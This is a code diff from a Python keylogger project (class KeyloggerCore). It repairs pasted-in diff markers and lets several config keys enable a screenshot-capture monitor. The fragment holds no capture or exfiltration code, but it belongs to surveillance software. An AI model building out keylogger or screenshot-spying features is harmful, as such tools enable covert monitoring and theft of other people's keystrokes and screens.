@@ -200,28 +200,19 @@ class KeyloggerCore:
                     logger.error(f"Failed to initialize window monitor: {e}")
 
             # Initialize screenshot monitor if enabled
-            # Initialize screenshot monitor if enabled
-            -            shots_enabled = self.config_manager.get('features.screenshots', False)
-            -            if shots_enabled and ScreenshotMonitor is not None:
-            -                try:
-            -                    self.screenshot_monitor = ScreenshotMonitor(self)
-            -                    logger.info("Screenshot monitor initialized")
-            -                except Exception as e:
-            -                    logger.error(f"Failed to initialize screenshot monitor: {e}")
-            +            # Support multiple configuration keys for enabling screenshots
-            +            shots_enabled = bool(
-            +                self.config_manager.get('features.screenshots', False) or
-            +                self.config_manager.get('features.screenshot_capture', False) or
-            +                self.config_manager.get('screenshots.enabled', False)
-            +            )
-            +            if shots_enabled and ScreenshotMonitor is not None:
-            +                try:
-            +                    self.screenshot_monitor = ScreenshotMonitor(self)
-            +                    logger.info("Screenshot monitor initialized")
-            +                except Exception as e:
-            +                    logger.error(f"Failed to initialize screenshot monitor: {e}")
-            except Exception as e:
-                logger.error(f"Error initializing utilities: {e}")
+            shots_enabled = bool(
+                self.config_manager.get('features.screenshots', False)
+                or self.config_manager.get('features.screenshot_capture', False)
+                or self.config_manager.get('screenshots.enabled', False)
+            )
+            if shots_enabled and ScreenshotMonitor is not None:
+                try:
+                    self.screenshot_monitor = ScreenshotMonitor(self)
+                    logger.info("Screenshot monitor initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize screenshot monitor: {e}")
+        except Exception as e:
+            logger.error(f"Error initializing utilities: {e}")
     
     def start(self) -> bool:
         """Start the keylogger."""
